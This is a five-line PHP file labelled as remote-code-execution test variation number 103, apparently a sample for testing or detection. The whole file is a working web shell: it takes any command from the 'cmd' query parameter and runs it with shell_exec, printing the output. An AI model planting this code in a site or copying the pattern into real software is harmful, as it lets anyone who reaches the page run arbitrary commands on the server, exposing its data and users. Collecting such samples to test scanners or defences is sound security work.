<?php
// RCE test variation #103
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>